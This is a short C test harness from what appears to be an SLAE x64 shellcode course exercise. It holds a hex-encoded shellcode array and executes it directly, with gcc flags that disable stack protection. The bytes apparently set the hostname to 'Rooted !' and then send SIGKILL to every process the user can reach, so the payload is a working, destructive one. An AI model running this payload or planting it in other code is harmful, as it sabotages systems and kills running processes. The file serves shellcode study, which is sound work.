/*
Filename:      shellcode-orig.c
Author:        Nicolas Barrière
Student ID:    SLAE - 1398
Created Date:  03.02.2019
Note:          x64
Compiler:      gcc -ggdb -fno-stack-protector -z execstack shellcode-orig.c -o shellcode-orig
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\xb0\xaa\x49\xb8\x52\x6f\x6f\x74\x65\x64\x20\x21\x41\x50\x48\x89"
"\xe7\x40\xb6\x08\x0f\x05\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05";

main()
{
  printf("Shellcode Lenght: %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
